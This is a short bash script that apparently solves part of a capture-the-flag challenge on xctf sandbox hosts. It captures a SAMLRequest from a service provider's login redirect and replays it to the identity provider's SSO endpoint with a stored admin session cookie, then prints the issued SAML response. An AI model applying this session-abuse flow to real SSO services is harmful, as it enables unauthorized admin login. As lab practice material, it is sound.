#!/bin/bash
IDP="http://oj-10-30-15-1-56469.adworld.xctf.org.cn"
SP="http://oj-10-30-15-1-44153.adworld.xctf.org.cn"

# 1. SP login redirect to get SAMLRequest
LOC=$(curl -s -c sp_cookies.txt -D - -o /dev/null "$SP/saml/login" | grep -i '^Location:' | sed 's/Location: //' | tr -d '\r')
echo "SP redirect: $LOC"

# extract SAMLRequest param
SAMLREQ=$(echo "$LOC" | sed -n 's/.*SAMLRequest=\([^&]*\).*/\1/p')
echo "SAMLRequest: $SAMLREQ"

# 2. Call IdP SSO with admin cookie
curl -s -b admin_cookies.txt -c admin_cookies.txt "$IDP/saml/sso?SAMLRequest=$SAMLREQ&RelayState=/" -o sso_resp.html
echo "=== SSO response (saml_post) ==="
cat sso_resp.html
